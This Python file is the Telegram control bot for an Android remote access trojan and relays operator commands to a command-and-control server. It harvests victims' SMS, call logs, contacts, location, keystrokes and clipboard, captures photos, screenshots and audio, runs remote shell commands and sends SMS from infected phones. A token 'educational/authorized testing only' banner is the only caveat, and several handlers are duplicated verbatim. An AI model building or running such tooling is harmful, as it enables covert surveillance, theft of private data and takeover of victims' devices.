#!/usr/bin/env python3
"""
Telegram Bot for RAT C2 Control
Features:
- /devices - List connected devices
- /info <id> - Get device info
- /sms <id> - Get SMS messages
- /calls <id> - Get call logs
- /contacts <id> - Get contacts
- /location <id> - Get location
- /shell <id> <cmd> - Execute shell command
- /apps <id> - List installed apps
- /sms_send <id> <number> <text> - Send SMS
- /photo <id> - Take photo
- /screenshot <id> - Take screenshot
- /audio <id> [duration] - Record audio
- /keylogs <id> - Get keylogs
- /notify - Toggle notifications for new devices
"""

import os
import json
import asyncio
import logging
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# Configuration
C2_URL = "https://par-instructions-former-numbers.trycloudflare.com"
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_USERS = set(map(int, os.getenv("TELEGRAM_ADMIN_USERS", "").split(","))) if os.getenv("TELEGRAM_ADMIN_USERS") else set()

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global state
notification_users = set()  # Users who want notifications
device_cache = {}  # Cache device list

async def api_get(endpoint):
    """Make GET request to C2 API"""
    try:
        response = requests.get(f"{C2_URL}{endpoint}", timeout=10)
        return response.json()
    except Exception as e:
        logger.error(f"API GET error: {e}")
        return None

async def api_post(endpoint, data):
    """Make POST request to C2 API"""
    try:
        response = requests.post(
            f"{C2_URL}{endpoint}",
            json=data,
            headers={'Content-Type': 'application/json'},
            timeout=15
        )
        return response.json()
    except Exception as e:
        logger.error(f"API POST error: {e}")
        return None

async def get_devices():
    """Get and cache device list"""
    global device_cache
    data = await api_get("/clients")
    if data and "clients" in data:
        device_cache = {d["id"]: d for d in data["clients"]}
        return data["clients"]
    return []

def format_device(device):
    """Format device info for display"""
    status = "🟢 Online" if device.get("online") else "🔴 Offline"
    return (
        f"📱 *{device.get('model', 'Unknown')}* ({device.get('manufacturer', 'Unknown')})\n"
        f"🆔 ID: `{device['id']}`\n"
        f"📱 Android: {device.get('android_version', 'Unknown')}\n"
        f"🌐 IP: {device.get('ip', 'Unknown')}\n"
        f"🔋 Battery: {device.get('battery', {}).get('percentage', '?')}%\n"
        f"📶 Network: {device.get('network', {}).get('type', 'Unknown')}\n"
        f"Status: {status}"
    )

def get_main_keyboard():
    """Main menu keyboard"""
    keyboard = [
        [InlineKeyboardButton("📱 Devices", callback_data="cmd_devices")],
        [InlineKeyboardButton("🔔 Notifications ON", callback_data="cmd_notify_on"),
         InlineKeyboardButton("🔕 Notifications OFF", callback_data="cmd_notify_off")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="cmd_refresh"),
         InlineKeyboardButton("❓ Help", callback_data="cmd_help")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_device_keyboard(device_id):
    """Device-specific keyboard"""
    keyboard = [
        [InlineKeyboardButton("ℹ️ Info", callback_data=f"cmd_info:{device_id}"),
         InlineKeyboardButton("📱 SMS", callback_data=f"cmd_sms:{device_id}")],
        [InlineKeyboardButton("📞 Calls", callback_data=f"cmd_calls:{device_id}"),
         InlineKeyboardButton("👥 Contacts", callback_data=f"cmd_contacts:{device_id}")],
        [InlineKeyboardButton("📍 Location", callback_data=f"cmd_location:{device_id}"),
         InlineKeyboardButton("📷 Photo", callback_data=f"cmd_photo:{device_id}")],
        [InlineKeyboardButton("📸 Screenshot", callback_data=f"cmd_screenshot:{device_id}"),
         InlineKeyboardButton("🎤 Audio", callback_data=f"cmd_audio:{device_id}")],
        [InlineKeyboardButton("🖥 Shell", callback_data=f"cmd_shell:{device_id}"),
         InlineKeyboardButton("📱 Apps", callback_data=f"cmd_apps:{device_id}")],
        [InlineKeyboardButton("⌨️ Keylogs", callback_data=f"cmd_keylogs:{device_id}"),
         InlineKeyboardButton("📋 Clipboard", callback_data=f"cmd_clipboard:{device_id}")],
        [InlineKeyboardButton("📤 Send SMS", callback_data=f"cmd_sms_send:{device_id}"),
         InlineKeyboardButton("🔙 Back", callback_data="cmd_devices")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ===== Command Handlers =====

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if ADMIN_USERS and user_id not in ADMIN_USERS:
        await update.message.reply_text("❌ Unauthorized. Contact admin for access.")
        return
    
    await update.message.reply_text(
        "🕷️ *RAT C2 Control Bot*\n\n"
        "Welcome! Use the buttons below to control connected devices.\n\n"
        "⚠️ *For educational/authorized testing only*",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🕷️ *RAT C2 Bot Commands*\n\n"
        "*/start* - Start bot\n"
        "*/devices* - List connected devices\n"
        "*/info <id>* - Device info\n"
        "*/sms <id>* - Get SMS\n"
        "*/calls <id>* - Get call logs\n"
        "*/contacts <id>* - Get contacts\n"
        "*/location <id>* - Get GPS location\n"
        "*/shell <id> <cmd>* - Execute shell\n"
        "*/apps <id>* - List apps\n"
        "*/photo <id>* - Take photo\n"
        "*/screenshot <id>* - Take screenshot\n"
        "*/audio <id> [sec]* - Record audio\n"
        "*/sms_send <id> <num> <text>* - Send SMS\n"
        "*/keylogs <id>* - Get keylogs\n"
        "*/clipboard <id>* - Get clipboard\n"
        "*/notify* - Toggle notifications\n"
        "*/devices* - Refresh device list"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def devices_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    devices = await get_devices()
    if not devices:
        await update.message.reply_text("📱 No devices connected", reply_markup=get_main_keyboard())
        return
    
    text = f"📱 *Connected Devices ({len(devices)})*\n\n"
    for d in devices:
        status = "🟢" if d.get("online") else "🔴"
        text += f"{status} *{d.get('model', 'Unknown')}* - `{d['id'][:8]}...`\n"
    
    # Create inline keyboard with device selection
    keyboard = []
    for d in devices:
        keyboard.append([InlineKeyboardButton(
            f"{'🟢' if d.get('online') else '🔴'} {d.get('model', 'Unknown')} ({d['id'][:8]}...)",
            callback_data=f"cmd_select:{d['id']}"
        )])
    keyboard.append([InlineKeyboardButton("🔄 Refresh", callback_data="cmd_refresh")])
    
    await update.message.reply_text(
        text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if ADMIN_USERS and user_id not in ADMIN_USERS:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    data = query.data
    
    if data == "cmd_devices":
        devices = await get_devices()
        if not devices:
            await query.edit_message_text("📱 No devices connected", reply_markup=get_main_keyboard())
            return
        keyboard = []
        for d in devices:
            keyboard.append([InlineKeyboardButton(
                f"{'🟢' if d.get('online') else '🔴'} {d.get('model', 'Unknown')} ({d['id'][:8]}...)",
                callback_data=f"cmd_select:{d['id']}"
            )])
        keyboard.append([InlineKeyboardButton("🔄 Refresh", callback_data="cmd_refresh")])
        await query.edit_message_text(
            f"📱 *Connected Devices ({len(devices)})*",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif data == "cmd_refresh":
        await devices_cmd(update, context)
    
    elif data == "cmd_notify_on":
        notification_users.add(query.from_user.id)
        await query.edit_message_text(
            "🔔 Notifications enabled!\nYou'll be notified when new devices connect.",
            reply_markup=get_main_keyboard()
        )
    
    elif data == "cmd_notify_off":
        notification_users.discard(query.from_user.id)
        await query.edit_message_text(
            "🔕 Notifications disabled",
            reply_markup=get_main_keyboard()
        )
    
    elif data == "cmd_help":
        await help_cmd(update, context)
    
    elif data == "cmd_refresh":
        await devices_cmd(update, context)
    
    elif data.startswith("cmd_select:"):
        device_id = data.split(":", 1)[1]
        device = device_cache.get(device_id)
        if not device:
            devices = await get_devices()
            device = next((d for d in devices if d["id"] == device_id), None)
        
        if device:
            await query.edit_message_text(
                format_device(device),
                parse_mode="Markdown",
                reply_markup=get_device_keyboard(device_id)
            )
        else:
            await query.edit_message_text("Device not found", reply_markup=get_main_keyboard())
    
    elif data.startswith("cmd_info:"):
        device_id = data.split(":", 1)[1]
        device = device_cache.get(device_id)
        if not device:
            devices = await get_devices()
            device = next((d for d in devices if d["id"] == device_id), None)
        
        if device:
            result = await api_post("/command", {
                "clientId": device_id,
                "command": "device_info",
                "args": {}
            })
            text = f"ℹ️ *Device Info*\n\n{format_device(device)}"
            if result:
                text += f"\n\n📋 *Details:*\n```json\n{json.dumps(result, indent=2)[:3000]}```"
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_sms:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_sms",
            "args": {"limit": 50}
        })
        if result and "sms" in result:
            text = f"📱 *SMS Messages ({len(result['sms'])})*\n\n"
            for sms in result["sms"][:10]:
                text += f"📩 *{sms.get('address', 'Unknown')}*\n{sms.get('body', '')[:100]}\n🕐 {sms.get('date', '')}\n\n"
            if len(result["sms"]) > 10:
                text += f"... and {len(result['sms']) - 10} more"
        else:
            text = "No SMS data or error"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_calls:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_calls",
            "args": {"limit": 50}
        })
        if result and "calls" in result:
            text = f"📞 *Call Logs ({len(result['calls'])})*\n\n"
            for call in result["calls"][:10]:
                text += f"📞 *{call.get('number', 'Unknown')}* ({call.get('type', 'Unknown')})\n🕐 {call.get('date', '')} • ⏱ {call.get('duration', 0)}s\n\n"
            if len(result["calls"]) > 10:
                text += f"... and {len(result['calls']) - 10} more"
        else:
            text = "No call data or error"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_contacts:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_contacts",
            "args": {"limit": 100}
        })
        if result and "contacts" in result:
            text = f"👥 *Contacts ({len(result['contacts'])})*\n\n"
            for c in result["contacts"][:15]:
                text += f"👤 *{c.get('name', 'Unknown')}*\n📞 {c.get('phones', [{}])[0].get('number', 'No number')}\n\n"
            if len(result["contacts"]) > 15:
                text += f"... and {len(result['contacts']) - 15} more"
        else:
            text = "No contacts data or error"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_location:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_location",
            "args": {}
        })
        if result:
            text = f"📍 *Location*\n\n"
            if isinstance(result, dict):
                text += f"📍 Lat: {result.get('latitude', 'N/A')}\n"
                text += f"📍 Lon: {result.get('longitude', 'N/A')}\n"
                text += f"🎯 Acc: {result.get('accuracy', 'N/A')}m\n"
                text += f"🕐 Time: {result.get('time', 'N/A')}"
            else:
                text += f"```json\n{json.dumps(result, indent=2)[:2000]}```"
        else:
            text = "No location data"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_shell:"):
        device_id = data.split(":", 1)[1]
        # Ask for command
        await query.edit_message_text(
            "🖥 *Shell Command*\n\nSend the command you want to execute:\n\nExample: `ls -la` or `whoami`",
            parse_mode="Markdown"
        )
        # Store state for next message
        context.user_data["awaiting_shell"] = device_id
    
    elif data.startswith("cmd_apps:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_installed_apps",
            "args": {"include_system": False}
        })
        if result and "apps" in result:
            text = f"📱 *Installed Apps ({len(result['apps'])})*\n\n"
            for app in result["apps"][:20]:
                text += f"📱 *{app.get('name', 'Unknown')}*\n   `{app.get('package', 'Unknown')}`\n\n"
            if len(result["apps"]) > 20:
                text += f"... and {len(result['apps']) - 20} more"
        else:
            text = "No apps data or error"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_photo:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "take_photo",
            "args": {"camera": 0, "quality": 80}
        })
        text = "📷 Photo captured!" if result and result.get("success") else "Failed to take photo"
        await query.edit_message_text(text, reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_screenshot:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "screenshot",
            "args": {}
        })
        text = "📸 Screenshot captured!" if result and result.get("success") else "Failed to take screenshot"
        await query.edit_message_text(text, reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_audio:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "record_audio",
            "args": {"duration": 10000, "format": "amr"}
        })
        text = "🎤 Audio recording started (10s)!" if result and result.get("success") else "Failed to record audio"
        await query.edit_message_text(text, reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_keylogs:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_keylogs",
            "args": {}
        })
        if result and "keylogs" in result:
            text = f"⌨️ *Keylogs ({len(result['keylogs'])})*\n\n"
            for log in result["keylogs"][:10]:
                text += f"📦 *{log.get('package', 'Unknown')}*\n{log.get('text', '')[:100]}\n🕐 {log.get('timestamp', '')}\n\n"
            if len(result["keylogs"]) > 10:
                text += f"... and {len(result['keylogs']) - 10} more"
        else:
            text = "No keylog data"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_clipboard:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_clipboard",
            "args": {}
        })
        text = f"📋 *Clipboard*\n\n{result.get('text', 'Empty')}" if result else "Failed"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_sms_send:"):
        device_id = data.split(":", 1)[1]
        context.user_data["awaiting_sms_send"] = device_id
        await query.edit_message_text(
            "📤 *Send SMS*\n\nSend in format:\n`number|message`\n\nExample:\n`+1234567890|Hello from RAT!`",
            parse_mode="Markdown"
        )
        context.user_data["awaiting_sms_send"] = device_id
    
    elif data.startswith("cmd_photo:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "take_photo",
            "args": {"camera": 0, "quality": 80}
        })
        text = "📷 Photo captured!" if result and result.get("success") else "Failed to take photo"
        await query.edit_message_text(text, reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_screenshot:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "screenshot",
            "args": {}
        })
        text = "📸 Screenshot captured!" if result and result.get("success") else "Failed to take screenshot"
        await query.edit_message_text(text, reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_audio:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "record_audio",
            "args": {"duration": 10000, "format": "amr"}
        })
        text = "🎤 Audio recording started (10s)!" if result and result.get("success") else "Failed to record audio"
        await query.edit_message_text(text, reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_keylogs:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_keylogs",
            "args": {}
        })
        if result and "keylogs" in result:
            text = f"⌨️ *Keylogs ({len(result['keylogs'])})*\n\n"
            for log in result["keylogs"][:10]:
                text += f"📦 *{log.get('package', 'Unknown')}*\n{log.get('text', '')[:100]}\n🕐 {log.get('timestamp', '')}\n\n"
            if len(result["keylogs"]) > 10:
                text += f"\n... and {len(result['keylogs']) - 10} more"
        else:
            text = "No keylog data"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_clipboard:"):
        device_id = data.split(":", 1)[1]
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "get_clipboard",
            "args": {}
        })
        text = f"📋 *Clipboard*\n\n{result.get('text', 'Empty')}" if result else "Failed"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_device_keyboard(device_id))
    
    elif data.startswith("cmd_sms_send:"):
        device_id = data.split(":", 1)[1]
        context.user_data["awaiting_sms_send"] = device_id
        await query.edit_message_text(
            "📤 *Send SMS*\n\nSend in format:\n`number|message`\n\nExample:\n`+1234567890|Hello from RAT!`",
            parse_mode="Markdown"
        )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if ADMIN_USERS and user_id not in ADMIN_USERS:
        return
    
    text = update.message.text
    
    # Handle awaiting shell command
    if context.user_data.get("awaiting_shell"):
        device_id = context.user_data.pop("awaiting_shell")
        result = await api_post("/command", {
            "clientId": device_id,
            "command": "shell",
            "args": {"cmd": text}
        })
        if result:
            text = f"🖥 *Shell Output*\n```\n{result.get('stdout', '')}\n{result.get('stderr', '')}```"
        else:
            text = "Shell command failed"
        await update.message.reply_text(text, parse_mode="Markdown")
        return
    
    # Handle awaiting SMS send
    if context.user_data.get("awaiting_sms_send"):
        device_id = context.user_data.pop("awaiting_sms_send")
        if "|" in text:
            number, msg = text.split("|", 1)
            result = await api_post("/command", {
                "clientId": device_id,
                "command": "send_sms",
                "args": {"number": number.strip(), "text": msg.strip()}
            })
            text = "✅ SMS sent!" if result and result.get("success") else "❌ Failed to send SMS"
        else:
            text = "Invalid format. Use: number|message"
        await update.message.reply_text(text)
        return

async def notify_new_device(device):
    """Send notification to all users with notifications enabled"""
    text = f"🔔 *New Device Connected!*\n\n{format_device(device)}"
    for user_id in notification_users:
        try:
            await app.bot.send_message(
                chat_id=user_id,
                text=text,
                parse_mode="Markdown",
                reply_markup=get_device_keyboard(device["id"])
            )
        except Exception as e:
            logger.error(f"Failed to notify {user_id}: {e}")

async def device_monitor():
    """Background task to monitor new devices"""
    global device_cache
    while True:
        try:
            devices = await get_devices()
            new_devices = set(d["id"] for d in devices) - set(device_cache.keys())
            for device_id in new_devices:
                device = next((d for d in devices if d["id"] == device_id), None)
                if device:
                    await notify_new_device(device)
            device_cache = {d["id"]: d for d in devices}
        except Exception as e:
            logger.error(f"Device monitor error: {e}")
        await asyncio.sleep(30)

def main():
    global app
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("Please set TELEGRAM_BOT_TOKEN environment variable")
        return
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    app = application  # Global for notifications
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("devices", devices_cmd))
    application.add_handler(CommandHandler("info", lambda u, c: c.bot.send_message(u.effective_chat.id, "Use /devices and click a device")))
    application.add_handler(CallbackQueryHandler(callback_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    # Start background tasks
    async def post_init(application):
        asyncio.create_task(device_monitor())
    
    application.post_init = post_init
    
    # Run
    logger.info("Starting RAT Telegram Bot...")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()